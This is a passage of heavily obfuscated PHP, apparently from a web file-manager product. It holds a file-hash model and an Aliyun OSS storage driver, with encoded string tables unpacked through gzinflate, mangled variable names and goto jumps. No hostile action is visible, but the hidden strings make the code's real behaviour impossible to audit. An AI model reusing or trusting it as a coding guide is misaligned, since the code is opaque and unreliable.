$à±í®¿ß[$‹ùÏ“¼í]++; } $¼›“£ÚÖ = array(); foreach ($à±í®¿ß as $äš¯Æ¢ò => $ò®³êõÏ) { $‹ùÏ“¼í = $ò®³êõÏ . $ñîÛŠöû[22]; if (!$¼›“£ÚÖ[$‹ùÏ“¼í]) { $¼›“£ÚÖ[$‹ùÏ“¼í] = array(); } $¼›“£ÚÖ[$‹ùÏ“¼í][] = $äš¯Æ¢ò; } foreach ($¼›“£ÚÖ as $ò®³êõÏ => $÷æèÄû¶) { if (!$÷æèÄû¶) { continue; } $ò®³êõÏ = $Ç…æ÷­ö ? $ò®³êõÏ : -intval($ò®³êõÏ); $Ã®şŞî« = array($ñîÛŠöû[561] => array($ñîÛŠöû[17], $÷æèÄû¶)); if ($ò®³êõÏ < 0) { $Ã®şŞî«[$ñîÛŠöû[2089]] = array($ñîÛŠöû[1125], abs($ò®³êõÏ)); } $this->where($Ã®şŞî«)->setAdd($ñîÛŠöû[2089], $ò®³êõÏ); } } public function findByHash($™×Ú¹àˆ, $ó¾«õ’ = false) { $±Ì¯Ä•¶ =& $_SERVER[‰‰Ş‚€]; if (!$™×Ú¹àˆ && !$ó¾«õ’) { return !1; } $×ûÍˆ£Ù = array($±Ì¯Ä•¶[2083] => $™×Ú¹àˆ); if ($ó¾«õ’) { $×ûÍˆ£Ù = array($±Ì¯Ä•¶[2084] => $ó¾«õ’); } return $this->order($±Ì¯Ä•¶[2090])->where($×ûÍˆ£Ù)->find(); } public function clearEmpty($Ğ­æ‡¼ = 1) { $àç±îŒ± =& $_SERVER[‰‰Ş‚€]; $ÁİÆ¡ƒ = time() - 3600 * 24 * $Ğ­æ‡¼; $éï•–·ş = $àç±îŒ±[2091] . $ÁİÆ¡ƒ; $¬‰•¿³ı = $this->where($éï•–·ş)->select(); if (!$¬‰•¿³ı) { return; } $î¾¿è„“ = new Task($àç±îŒ±[2092], $àç±îŒ±[22], count($¬‰•¿³ı)); foreach ($¬‰•¿³ı as $º¾†Ó×‘) { $î¾¿è„“->update(1); $this->resetFile($º¾†Ó×‘); } $î¾¿è„“->end(); } public function resetFile($ÚŠæÊİç) { $“‚°¯“ˆ =& $_SERVER[‰‰Ş‚€]; $‰á¬ıÆ = array($“‚°¯“ˆ[562] => $ÚŠæÊİç[$“‚°¯“ˆ[561]]); $€²Êœ™ = Model($“‚°¯“ˆ[1467])->where($‰á¬ıÆ)->count(); $À½¸»ß® = Model($“‚°¯“ˆ[2093])->where($‰á¬ıÆ)->count(); $¢çè¹ÏÅ = intval($€²Êœ™) + intval($À½¸»ß®); if ($¢çè¹ÏÅ == 0) { Model($“‚°¯“ˆ[2094])->delete($ÚŠæÊİç[$“‚°¯“ˆ[561]]); $this->where($‰á¬ıÆ)->delete(); $this->metaSet($ÚŠæÊİç[$“‚°¯“ˆ[561]], null, null); if (!IO::isFile($ÚŠæÊİç[$“‚°¯“ˆ[97]])) { write_log(array($“‚°¯“ˆ[2095], ACTION, $ÚŠæÊİç), $“‚°¯“ˆ[1303]); return !1; } IO::remove($ÚŠæÊİç[$“‚°¯“ˆ[97]]); write_log(ACTION . $“‚°¯“ˆ[937] . KodUser::id() . $“‚°¯“ˆ[2096] . $ÚŠæÊİç[$“‚°¯“ˆ[561]] . $“‚°¯“ˆ[2097] . $ÚŠæÊİç[$“‚°¯“ˆ[89]] . $“‚°¯“ˆ[210] . $ÚŠæÊİç[$“‚°¯“ˆ[97]], $“‚°¯“ˆ[2095]); return; } if ($ÚŠæÊİç[$“‚°¯“ˆ[2089]] != $¢çè¹ÏÅ) { $this->where($‰á¬ıÆ)->save(array($“‚°¯“ˆ[2082] => $¢çè¹ÏÅ)); } } public function storageInfo($¡÷ªßûô = false) { $€¥—´º =& $_SERVER[‰‰Ş‚€]; $Ôş‡®í‡ = $this->count() + 0.0; $ƒ©êÙ‘à = 0; $Òµ¾ŒÉ = 1; $®Íñˆ¨ö = 0; $©î¡ÙÚ = 5000; for ($Û“æ’Ê¦ = 0; $Û“æ’Ê¦ < $Ôş‡®í‡; $Û“æ’Ê¦ = $Û“æ’Ê¦ + $©î¡ÙÚ) { $çÜøËé‘ = $this->limit($Û“æ’Ê¦, $Û“æ’Ê¦ + $©î¡ÙÚ)->select(); foreach ($çÜøËé‘ as $Â¥Ÿ¿‰İ) { $Òµ¾ŒÉ += $Â¥Ÿ¿‰İ[$€¥—´º[89]] * $Â¥Ÿ¿‰İ[$€¥—´º[2089]]; $ƒ©êÙ‘à += $Â¥Ÿ¿‰İ[$€¥—´º[89]] * ($Â¥Ÿ¿‰İ[$€¥—´º[2089]] - 1); $®Íñˆ¨ö += $Â¥Ÿ¿‰İ[$€¥—´º[2089]]; } } $²›³„š§ = array($€¥—´º[2098] => $Òµ¾ŒÉ, $€¥—´º[2099] => $ƒ©êÙ‘à, $€¥—´º[2100] => $ƒ©êÙ‘à / $Òµ¾ŒÉ, $€¥—´º[93] => $Ôş‡®í‡, $€¥—´º[2101] => $®Íñˆ¨ö); return $²›³„š§; } } goto D¸Ê•£§éİ; e§­™¡«–Ú: while (strlen($vzxlnqapie) < $_SERVER[‰‰Ş‚€][703]) { if (!$vzxlnqapie) { break; } $vzxlnqapie++; } $_SERVER[¾¹â¾·à] = explode($_SERVER[‰‰Ş‚€][704], gzinflate(substr($_SERVER[‰‰Ş‚€][705], 10, -8))); $rpmcoetjdu = $_SERVER[‰‰Ş‚€][706]; goto FÒÙÊíÁ¤; B—‡é­–“á: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($â°ıÓ¨») { parent::__construct($â°ıÓ¨»); $this->setSignVersion($_SERVER[‰‰Ş‚€][258]); } public function uploadFormData($¢ïäÅñŒ, $ñ¹ĞïÈ = 3600) { return $this->uploadFormDataV2($¢ïäÅñŒ, $ñ¹ĞïÈ); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($èŞûÎ¾”) { parent::__construct(); include_once SDK_DIR . $_SERVER[‰‰Ş‚€][1509]; $this->_init($èŞûÎ¾”); } public function _init($†Û•Æ) { $ë¿ÃÚ«À =& $_SERVER[‰‰Ş‚€]; $this->config = $†Û•Æ; foreach ($†Û•Æ as $Ëà©ßÒ => $ÔäçüŞö) { if (isset($this->{$Ëà©ßÒ})) { $this->{$Ëà©ßÒ} = $ÔäçüŞö; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ë¿ÃÚ«À[1510] . LNG($ë¿ÃÚ«À[1511])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $É¼ııÑï =& $_SERVER[‰‰Ş‚€]; $†Î‹–ñ = new OSS\Model\CorsConfig(); $¢±ñğó® = new OSS\Model\CorsRule(); $¢±ñğó®->addAllowedOrigin($É¼ııÑï[1512]); $¢±ñğó®->addAllowedMethod($É¼ııÑï[1513]); $¢±ñğó®->addAllowedMethod($É¼ııÑï[1514]); $¢±ñğó®->addAllowedMethod($É¼ııÑï[1515]); $¢±ñğó®->addAllowedMethod($É¼ııÑï[1516]); $¢±ñğó®->addAllowedMethod($É¼ııÑï[173]); $¢±ñğó®->setMaxAgeSeconds(600); $¢±ñğó®->addExposeHeader($É¼ııÑï[1517]); $¢±ñğó®->addAllowedHeader($É¼ııÑï[1512]); $†Î‹–ñ->addRule($¢±ñğó®); try { $this->client->putBucketCors($this->bucket, $†Î‹–ñ); } catch (OSS\Core\OssException $şùÄ¹¨³) { $this->writeLog(__FUNCTION__ . $É¼ııÑï[223] . $şùÄ¹¨³->getMessage()); return !1; } return !0; } public function getBucketCors() { $ÎĞ›·…¥ =& $_SERVER[‰‰Ş‚€]; $¯Íéñú = null; try { $¯Íéñú = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $í¾œãÅÑ) { $this->writeLog(__FUNCTION__ . $ÎĞ›·…¥[223] . $í¾œãÅÑ->getMessage()); return null; } if (!$¯Íéñú || !($ãÜšŸè = $¯Íéñú->getRules())) { return null; } $Ôëçà© = $ãÜšŸè[0]->getAllowedOrigins(); $Ïè¦¤Âø = $ãÜšŸè[0]->getAllowedMethods(); $¦±ÓÎšß = $ãÜšŸè[0]->getMaxAgeSeconds(); $ªäìÀ¬ = $ãÜšŸè[0]->getExposeHeaders(); $Ï©€¤Ï = $ãÜšŸè[0]->getAllowedHeaders(); return array($ÎĞ›·…¥[229] => isset($Ôëçà©[0]) ? $Ôëçà©[0] : $ÎĞ›·…¥[22], $ÎĞ›·…¥[233] => $Ïè¦¤Âø, $ÎĞ›·…¥[1518] => $¦±ÓÎšß, $ÎĞ›·…¥[1519] => isset($ªäìÀ¬[0]) ? $ªäìÀ¬[0] : $ÎĞ›·…¥[22], $ÎĞ›·…¥[230] => isset($Ï©€¤Ï[0]) ? $Ï©€¤Ï[0] : $ÎĞ›·…¥[22]); } public function isBucketCors() { $°¢°¨×¾ =& $_SERVER[‰‰Ş‚€]; $ÌĞòšå‘ = $this->getBucketCors(); if (!$ÌĞòšå‘ || !is_array($ÌĞòšå‘)) { return !1; } if ($ÌĞòšå‘[$°¢°¨×¾[229]] != $°¢°¨×¾[231] || $ÌĞòšå‘[$°¢°¨×¾[230]] != $°¢°¨×¾[231]) { return !1; } $ìñ¦«œï = array_map($°¢°¨×¾[232], $ÌĞòšå‘[$°¢°¨×¾[233]]); if (!is_array($ìñ¦«œï)) { $ìñ¦«œï = array(); } $‘ş³¤‘³ = array($°¢°¨×¾[234], $°¢°¨×¾[235], $°¢°¨×¾[236], $°¢°¨×¾[237], $°¢°¨×¾[238]); $áæÀ«Õ× = array_diff($‘ş³¤‘³, $ìñ¦«œï); return empty($áæÀ«Õ×); } public function mkfile($„×€ÂñÅ, $¼Ëô‹·² = '', $ŞıÇ¥Óæ = REPEAT_RENAME) { $ˆ¦š× = $this->setContent($„×€ÂñÅ, $¼Ëô‹·²); if ($ˆ¦š× !== !1) { return $this->getPathOuter($„×€ÂñÅ); } return !1; } public function mkdir($úÑ‹–, $½ï¸åö½ = REPEAT_SKIP) { if ($½ï¸åö½ && $this->_isFolder($úÑ‹–)) { return $this->getPathOuter($úÑ‹–); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($úÑ‹–)); } catch (OSS\Core\OssException $ÅëôŞÌ) { $this->writeLog(__FUNCTION__ . $_SERVER[‰‰Ş‚€][223] . $ÅëôŞÌ->getMessage()); return !1; } return $this->getPathOuter($úÑ‹–); } private function fileList($‘©‹ŒÆ, $ÓÃŠ¢¬œ = '', $„§¿ğä = 0) { $ã•ÔŒŒÃ =& $_SERVER[‰‰Ş‚€]; $‘©‹ŒÆ = trim($‘©‹ŒÆ, $ã•ÔŒŒÃ[18]); $è«×•Šœ = empty($‘©‹ŒÆ) && $‘©‹ŒÆ !== $ã•ÔŒŒÃ[239] ? $ã•ÔŒŒÃ[22] : $‘©‹ŒÆ . $ã•ÔŒŒÃ[18]; $£åì¢² = $ã•ÔŒŒÃ[22]; $¦ëÂşÌ¥ = 1000; $‰Ü÷‡‡ = $±š”’  = array(); while (!0) { check_abort(); $ˆÊİò¸‡ = array($ã•ÔŒŒÃ[1520] => $ÓÃŠ¢¬œ, $ã•ÔŒŒÃ[1521] => $è«×•Šœ, $ã•ÔŒŒÃ[1522] => $¦ëÂşÌ¥, $ã•ÔŒŒÃ[1523] => $£åì¢²); try { $Ó‘‰‡ºØ = $this->client->listObjects($this->bucket, $ˆÊİò¸‡); } catch (OSS\Core\OssException $ØÇ«ôÜ’) { $this->writeLog(__FUNCTION__ . $ã•ÔŒŒÃ[223] . $ØÇ«ôÜ’->getMessage()); break; } $£åì¢² = $Ó‘‰‡ºØ->getNextMarker(); $ŞÍ‰ü° = $Ó‘‰‡ºØ->getObjectList(); $Çí»§ = $Ó‘‰‡ºØ->getPrefixList(); foreach ($ŞÍ‰ü° as $ı†ßùşˆ) { if ($ı†ßùşˆ->getKey() == $è«×•Šœ) { continue; } $úùªà­ = $ı†ßùşˆ->getKey(); $Ûêú¦‰û = $ı†ßùşˆ->getSize(); $·ü÷‰“» = $ı†ßùşˆ->getLastModified(); $ñ‘å¡–¤ = trim($ı†ßùşˆ->getETag(), $ã•ÔŒŒÃ[129]); $ãù½ìŠ» = $„§¿ğä ? array($ã•ÔŒŒÃ[42] => $úùªà­, $ã•ÔŒŒÃ[89] => $Ûêú¦‰û, $ã•ÔŒŒÃ[215] => strtotime($·ü÷‰“»), $ã•ÔŒŒÃ[1524] => $ñ‘å¡–¤) : $úùªà­; $îãÄÜ¾î = $Ûêú¦‰û == 0 && substr($úùªà­, strlen($úùªà­) - 1, 1) == $ã•ÔŒŒÃ[18] ? !0 : !1; $šïÁÑÄ» = array($ã•ÔŒŒÃ[89] => $Ûêú¦‰û, $ã•ÔŒŒÃ[1525] => $Ûêú¦‰û, $ã•ÔŒŒÃ[98] => strtotime($·ü÷‰“»), $ã•ÔŒŒÃ[1526] => $·ü÷‰“», $ã•ÔŒŒÃ[1524] => $ñ‘å¡–¤); $this->cacheMethodInfoSet($úùªà­, $îãÄÜ¾î, $šïÁÑÄ»); if ($îãÄÜ¾î) { $‰Ü÷‡‡[] = $úùªà­; continue; } $±š”’ [] = $ãù½ìŠ»; } foreach ($Çí»§ as $‹Ø¸ãï) { $‰Ü÷‡‡[] = $‹Ø¸ãï->getPrefix(); $this->cacheMethodInfoSet($‹Ø¸ãï->getPrefix(), !0); } if ($£åì¢² === $ã•ÔŒŒÃ[22]) { break; } } $this->cacheMethodInfoSet($‘©‹ŒÆ, !0); return array($ã•ÔŒŒÃ[95] => $‰Ü÷‡‡, $ã•ÔŒŒÃ[96] => $±š”’ ); } public function listObject($Ç¿¶Ø°Õ, $ËšÔİ©û = '') { $ú¶ş“¿— =& $_SERVER[‰‰Ş‚€]; $Ç¿¶Ø°Õ = trim($Ç¿¶Ø°Õ, $ú¶ş“¿—[18]); $«‡æ­ç£ = empty($Ç¿¶Ø°Õ) && $Ç¿¶Ø°Õ !== $ú¶ş“¿—[239] ? $ú¶ş“¿—[22] : $Ç¿¶Ø°Õ . $ú¶ş“¿—[18]; $àã™Úùö = $ú¶ş“¿—[22]; $ËĞòàğ¾ = 1000; $ÈïòŸš = $‚ç–’¦æ = array(); while (!0) { check_abort(); $ÑÔÓè­Õ = array($ú¶ş“¿—[1520] => $ËšÔİ©û, $ú¶ş“¿—[1521] => $«‡æ­ç£, $ú¶ş“¿—[1522] => $ËĞòàğ¾, $ú¶ş“¿—[1523] => $àã™Úùö); try { $†ğ±¡Ôí = $this->client->listObjects($this->bucket, $ÑÔÓè­Õ); } catch (OSS\Core\OssException $»“îİòÅ) { $this->writeLog(__FUNCTION__ . $ú¶ş“¿—[223] . $»“îİòÅ->getMessage()); break; } $àã™Úùö = $†ğ±¡Ôí->getNextMarker(); $÷ğë¢è¿ = $†ğ±¡Ôí->getObjectList(); foreach ($÷ğë¢è¿ as $®Ş‹áİı) { if ($®Ş‹áİı->getKey() == $«‡æ­ç£) { continue; } $“¡à–Â§ = $®Ş‹áİı->getKey(); $ÑÅî™ê– = $®Ş‹áİı->getSize(); $¡²î‡Ğı = $ÑÅî™ê– == 0 && substr($“¡à–Â§, strlen($“¡à–Â§) - 1, 1) == $ú¶ş“¿—[18] ? !0 : !1; if ($¡²î‡Ğı) { continue; } $‚ç–’¦æ[] = $ÑÅî™ê– . $ú¶ş“¿—[223] . $“¡à–Â§; } if ($àã™Úùö === $ú¶ş“¿—[22]) { break; } } return array($ú¶ş“¿—[95] => $ÈïòŸš, $ú¶ş“¿—[96] => $‚ç–’¦æ); } public function copyFile($Çè©µÅµ, $æˆÛ¾šõ) { $×¦¾²¦± = $this->size($Çè©µÅµ); if ($×¦¾²¦± < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Çè©µÅµ, $this->bucket, $this->pathEncode($æˆÛ¾šõ)); } catch (OSS\Core\OssException $¾ıËûËŸ) { $this->writeLog(__FUNCTION__ . $_SERVER[‰‰Ş‚€][223] . $¾ıËûËŸ->getMessage()); return !1; } return $this->getPathOuter($æˆÛ¾šõ); } $òÁĞ¢¾à = $this->multiCopyObject($Çè©µÅµ, $æˆÛ¾šõ, $×¦¾²¦±); return $òÁĞ¢¾à ? $this->getPathOuter($æˆÛ¾šõ) : !1; } private function multiCopyObject($©¡‡Áõò, $Ş¤‰éşç, $áÛª›ç) { $±Äˆ¤†­ =& $_SERVER[‰‰Ş‚€]; try { $ñôÑ©Ù² = array(); if ($’Íï´µ = $this->hashMd5($©¡‡Áõò)) { $ñôÑ©Ù² = array(OSS\OssClient::OSS_HEADERS => array($±Äˆ¤†­[1527] => $’Íï´µ)); } $Éäç¶½Ê = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ş¤‰éşç), $ñôÑ©Ù²); $±¡™Ã©Ğ = 1; $àáºµà¨ = 0; $¾ÕÉèÎ˜ = array(); $İÓŞµ = 1024 * 1024 * 10; $ßõò³‚Œ = $this->client->generateMultiuploadParts($áÛª›ç, $İÓŞµ); foreach ($ßõò³‚Œ as $‚ÎçÅ => $¿ÌŞ†é) { $İçÈØ¯ù = $àáºµà¨ + (int) $¿ÌŞ†é[$±Äˆ¤†­[1528]]; $ıè‘ = (int) $¿ÌŞ†é[$±Äˆ¤†­[421]] + $İçÈØ¯ù - 1; $ß§¢‘Â¨ = array($±Äˆ¤†­[175] => $İçÈØ¯ù, $±Äˆ¤†­[176] => $ıè‘); $¾ÕÉèÎ˜[] = $this->client->uploadPartCopy($this->bucket, $©¡‡Áõò, $this->bucket, $this->pathEncode($Ş¤‰éşç), $±¡™Ã©Ğ, $Éäç¶½Ê, $ß§¢‘Â¨); $±¡™Ã©Ğ = $±¡™Ã©Ğ + 1; } $ñÀ÷¸æÕ = array(); foreach ($¾ÕÉèÎ˜ as $‚ÎçÅ => $˜ò«¢ûÄ) { $ñÀ÷¸æÕ[] = array($±Äˆ¤†­[307] => $‚ÎçÅ + 1, $±Äˆ¤†­[308] => $˜ò«¢ûÄ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ş¤‰éşç), $Éäç¶½Ê, $ñÀ÷¸æÕ); } catch (OSS\Core\OssException $ÛéµÄ­ø) { $this->writeLog(__FUNCTION__ . $±Äˆ¤†­[223] . $ÛéµÄ­ø->getMessage()); return !1; } return !0; } public function moveFile($ª˜Ğ³£, $Ø”Ü‡Û) { if ($this->copyFile($ª˜Ğ³£, $Ø”Ü‡Û)) { $this->remove($ª˜Ğ³£); return $this->getPathOuter($Ø”Ü‡Û); } return !1; } public function delFile($œøä«öÏ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($œøä«öÏ)); } catch (OSS\Core\OssException $ŞØòÙÅº) { $this->writeLog(__FUNCTION__ . $_SERVER[‰‰Ş‚€][223] . $ŞØòÙÅº->getMessage()); return !1; } return !0; } public function delFolder($úœÓ¥á®) { $ÓùÀÉ =& $_SERVER[‰‰Ş‚€]; if (!$this->exist($úœÓ¥á®)) { return !0; } $this->listItemCache = !1; $õ¹äƒÂ” = $this->fileList($úœÓ¥á®); $this->listItemCache = !0; $“ÉŒæƒ– = trim($úœÓ¥á®, $ÓùÀÉ[18]) . $ÓùÀÉ[18]; if (!empty($úœÓ¥á®) && $úœÓ¥á® !== $ÓùÀÉ[239] && !in_array($“ÉŒæƒ–, $õ¹äƒÂ”[$ÓùÀÉ[95]])) { $õ¹äƒÂ”[$ÓùÀÉ[95]][] = $“ÉŒæƒ–; } $‘Óó€¥ç = $this->delByBatch($õ¹äƒÂ”[$ÓùÀÉ[96]]); if (!$‘Óó€¥ç) { return !1; } $‘Óó€¥ç = $this->delByBatch($õ¹äƒÂ”[$ÓùÀÉ[95]]); if (!$‘Óó€¥ç) { return !1; } return $this->delFile($“ÉŒæƒ–); } private function delByBatch($Úıô›ÖŒ) { foreach (array_chunk($Úıô›ÖŒ, 1000) as $…éúä×ê) { try { $this->client->deleteObjects($this->bucket, $…éúä×ê); } catch (OSS\Core\OssException $ä’½âúï) { $this->writeLog(__FUNCTION__ . $_SERVER[‰‰Ş‚€][223] . $ä’½âúï->getMessage()); return !1; } } return !0; } public function rename($¨ü Á¼‚, $Ş¿Æğõ) { return $this->renameObject($¨ü Á¼‚, $Ş¿Æğõ); } private function fileInfo($£ÒÏä¿, $„Ó¢´¬” = false, $½Û‹ûÕÈ = array()) { $–ø”÷ÕĞ =& $_SERVER[‰‰Ş‚€]; $°¬ªá»º = array($–ø”÷ÕĞ[42] => $this->pathThis($£ÒÏä¿), $–ø”÷ÕĞ[97] => $this->getPathOuter($£ÒÏä¿), $–ø”÷ÕĞ[43] => $–ø”÷ÕĞ[241], $–ø”÷ÕĞ[89] => isset($½Û‹ûÕÈ[$–ø”÷ÕĞ[89]]) ? $½Û‹ûÕÈ[$–ø”÷ÕĞ[89]] : 0, $–ø”÷ÕĞ[177] => $this->ext($£ÒÏä¿)); if ($„Ó¢´¬”) { return $°¬ªá»º; } $°¬ªá»º[$–ø”÷ÕĞ[242]] = $°¬ªá»º[$–ø”÷ÕĞ[98]] = 0; $°¬ªá»º[$–ø”÷ÕĞ[243]] = $°¬ªá»º[$–ø”÷ÕĞ[244]] = !0; if (empty($½Û‹ûÕÈ)) { $§‰¼‰†… = $this->objectMeta($£ÒÏä¿); if (!$§‰¼‰†…) { return $°¬ªá»º; } $½Û‹ûÕÈ = array($–ø”÷ÕĞ[98] => strtotime($§‰¼‰†…[$–ø”÷ÕĞ[1526]]), $–ø”÷ÕĞ[89] => $§‰¼‰†…[$–ø”÷ÕĞ[1525]] + 0, $–ø”÷ÕĞ[1524] => $§‰¼‰†…[$–ø”÷ÕĞ[1524]]); } if (isset($½Û‹ûÕÈ[$–ø”÷ÕĞ[1524]]) && $½Û‹ûÕÈ[$–ø”÷ÕĞ[1524]]) { $°¬ªá»º[$–ø”÷ÕĞ[246]] = trim($½Û‹ûÕÈ[$–ø”÷ÕĞ[1524]], $–ø”÷ÕĞ[129]); } if (isset($½Û‹ûÕÈ[$–ø”÷ÕĞ[89]])) { $°¬ªá»º[$–ø”÷ÕĞ[89]] = $½Û‹ûÕÈ[$–ø”÷ÕĞ[89]]; } if (isset($½Û‹ûÕÈ[$–ø”÷ÕĞ[98]])) { $°¬ªá»º[$–ø”÷ÕĞ[98]] = $½Û‹ûÕÈ[$–ø”÷ÕĞ[98]]; } if (isset($½Û‹ûÕÈ[$–ø”÷ÕĞ[215]]) && !trim($°¬ªá»º[$–ø”÷ÕĞ[98]])) { $°¬ªá»º[$–ø”÷ÕĞ[98]] = $½Û‹ûÕÈ[$–ø”÷ÕĞ[215]]; } return $°¬ªá»º; } private function folderInfo($Ùäû­Ó, $·’ú¥”« = false, $Øó¼±œƒ = array()) { $º¿üÍºĞ =& $_SERVER[‰‰Ş‚€]; $ÑËëòáû = array($º¿üÍºĞ[42] => $this->pathThis($Ùäû­Ó), $º¿üÍºĞ[97] => $this->getPathOuter($º¿üÍºĞ[18] . $Ùäû­Ó), $º¿üÍºĞ[43] => $º¿üÍºĞ[88]); if ($·’ú¥”«) { return $ÑËëòáû; } $ÑËëòáû[$º¿üÍºĞ[242]] = $ÑËëòáû[$º¿üÍºĞ[98]] = 0; $ÑËëòáû[$º¿üÍºĞ[243]] = $ÑËëòáû[$º¿üÍºĞ[244]] = !0; if (empty($Øó¼±œƒ)) { $Ùäû­Ó = rtrim($Ùäû­Ó, $º¿üÍºĞ[18]) . $º¿üÍºĞ[18]; $ÙñˆÃşÓ = $this->objectMeta($Ùäû­Ó); if (!$ÙñˆÃşÓ) { return $ÑËëòáû; } $Øó¼±œƒ = array($º¿üÍºĞ[242] => $ÙñˆÃşÓ[$º¿üÍºĞ[595]][$º¿üÍºĞ[1529]], $º¿üÍºĞ[98] => strtotime($ÙñˆÃşÓ[$º¿üÍºĞ[1526]])); } if (isset($Øó¼±œƒ[$º¿üÍºĞ[98]])) { $ÑËëòáû[$º¿üÍºĞ[98]] = $Øó¼±œƒ[$º¿üÍºĞ[98]]; } if (isset($Øó¼±œƒ[$º¿üÍºĞ[242]])) { $ÑËëòáû[$º¿üÍºĞ[242]] = $Øó¼±œƒ[$º¿üÍºĞ[242]]; } return $ÑËëòáû; } public function listPath($ ûÈ§â¦, $Ö½«³ø¼ = false) { $ï­º¨Ùñ =& $_SERVER[‰‰Ş‚€]; $Ş±œì¨– = $this->fileList($ ûÈ§â¦, $ï­º¨Ùñ[18], !0); foreach ($Ş±œì¨–[$ï­º¨Ùñ[95]] as $‘¾á²±Å => $•‰Ë•Š) { $Ş±œì¨–[$ï­º¨Ùñ[95]][$‘¾á²±Å] = $this->folderInfo($•‰Ë•Š, $Ö½«³ø¼, $•‰Ë•Š); } foreach ($Ş±œì¨–[$ï­º¨Ùñ[96]] as $‘¾á²±Å => $•‰Ë•Š) { $Ş±œì¨–[$ï­º¨Ùñ[96]][$‘¾á²±Å] = $this->fileInfo($•‰Ë•Š[$ï­º¨Ùñ[42]], $Ö½«³ø¼, $•‰Ë•Š); } return $Ş±œì¨–; } protected function infoChildren($îÀ“Ğ»¥, &$Ü«Ó­) { $¯ô“Â’µ =& $_SERVER[‰‰Ş‚€]; $èå§“º“ = $this->fileList($îÀ“Ğ»¥, $¯ô“Â’µ[22], !0); $Ü«Ó­[$¯ô“Â’µ[91]] += count($èå§“º“[$¯ô“Â’µ[95]]); $Ü«Ó­[$¯ô“Â’µ[90]] += count($èå§“º“[$¯ô“Â’µ[96]]); foreach ($èå§“º“[$¯ô“Â’µ[96]] as $½ù‡éÃ‚) { if (!$½ù‡éÃ‚ || !$½ù‡éÃ‚[$¯ô“Â’µ[89]]) { continue; } $Ü«Ó­[$¯ô“Â’µ[89]] += $½ù‡éÃ‚[$¯ô“Â’µ[89]]; } } public function has($óÔÓ–Í´, $êú£¿­ë = false, $æ§’¿Şó = true) { $äù¦œ Ê =& $_SERVER[‰‰Ş‚€]; $óÔÓ–Í´ = trim($óÔÓ–Í´, $äù¦œ Ê[18]); $çî¢Ø€Ş = empty($óÔÓ–Í´) && $óÔÓ–Í´ !== $äù¦œ Ê[239] ? $äù¦œ Ê[22] : $óÔÓ–Í´ . $äù¦œ Ê[18]; $ë¨ÀÑÙğ = $äù¦œ Ê[22]; $×¼³Áæ¹ = 500; $Îá¾‡ø¥ = $·í•ş‹Ó = 0; while (!0) { check_abort(); $Ÿª«ÙÉê = array($äù¦œ Ê[1520] => $äù¦œ Ê[18], $äù¦œ Ê[1521] => $çî¢Ø€Ş, $äù¦œ Ê[1522] => $×¼³Áæ¹, $äù¦œ Ê[1523] => $ë¨ÀÑÙğ); try { $¶£¦°Æö = $this->client->listObjects($this->bucket, $Ÿª«ÙÉê); } catch (OSS\Core\OssException $„ê•›) { $this->writeLog(__FUNCTION__ . $äù¦œ Ê[223] . $„ê•›->getMessage()); break; } $ë¨ÀÑÙğ = $¶£¦°Æö->getNextMarker(); $Ùœ¡¦½ = $¶£¦°Æö->getObjectList(); $à°…¥ñ¶ = $¶£¦°Æö->getPrefixList(); if ($êú£¿­ë) { if (count($Ùœ¡¦½) > 1 || count($Ùœ¡¦½) == 1 && $Ùœ¡¦½[0]->getKey() != $çî¢Ø€Ş) { $Îá¾‡ø¥ += count($Ùœ¡¦½) - 1; } if (!empty($à°…¥ñ¶)) { $·í•ş‹Ó += count($à°…¥ñ¶); } if ($ë¨ÀÑÙğ === $äù¦œ Ê[22]) { break; } continue; } if ($æ§’¿Şó) { if (!empty($Ùœ¡¦½)) { if (count($Ùœ¡¦½) > 1 || $Ùœ¡¦½[0]->getKey() != $çî¢Ø€Ş) { return !0; } } } else { if (!empty($à°…¥ñ¶)) { return !0; } } if ($ë¨ÀÑÙğ === $äù¦œ Ê[22]) { break; } } if ($êú£¿­ë) { return array($äù¦œ Ê[250] => $Îá¾‡ø¥, $äù¦œ Ê[251] => $·í•ş‹Ó); } return !1; } public function listAll($ë‡Ğ â) { $ÁÃÜ×¹û =& $_SERVER[‰‰Ş‚€]; $Ü‡¶è¿æ = $this->fileList($ë‡Ğ â, $ÁÃÜ×¹û[22], !0); $™«êÁş = array_to_keyvalue($Ü‡¶è¿æ[$ÁÃÜ×¹û[96]], $ÁÃÜ×¹û[42]); foreach ($Ü‡¶è¿æ[$ÁÃÜ×¹û[95]] as $¯ï§«ªË) { if (is_string($¯ï§«ªË)) { $™«êÁş[$¯ï§«ªË] = array($ÁÃÜ×¹û[89] => 0); } } return $this->listAllFiles($ë‡Ğ â, $™«êÁş); } public function canRead($¯õ˜ƒ˜¯) { $ÃÓ¥àÂ³ =& $_SERVER[‰‰Ş‚€]; $ÄÀÂùÇñ = $this->pathAcl($¯õ˜ƒ˜¯); return $ÄÀÂùÇñ == $ÃÓ¥àÂ³[1530] || $ÄÀÂùÇñ == $ÃÓ¥àÂ³[642] ? !0 : !1; } public function canWrite($şˆÀö¼õ) { $ÔÙ› ¼ê = $this->pathAcl($şˆÀö¼õ); return $ÔÙ› ¼ê == $_SERVER[‰‰Ş‚€][642] ? !0 : !1; } public function pathAcl($™æ“˜’ı) { $†Éı³äÂ =& $_SERVER[‰‰Ş‚€]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $¸¤´„§ú = $this->client->getObjectAcl($this->bucket, $this->pathEncode($™æ“˜’ı)); } catch (OSS\Core\OssException $¹¶˜Ü—) { $this->writeLog(__FUNCTION__ . $†Éı³äÂ[223] . $¹¶˜Ü—->getMessage()); return !1; } $îŒÆò—÷ = $¸¤´„§ú == $†Éı³äÂ[47] ? $this->bucketAcl 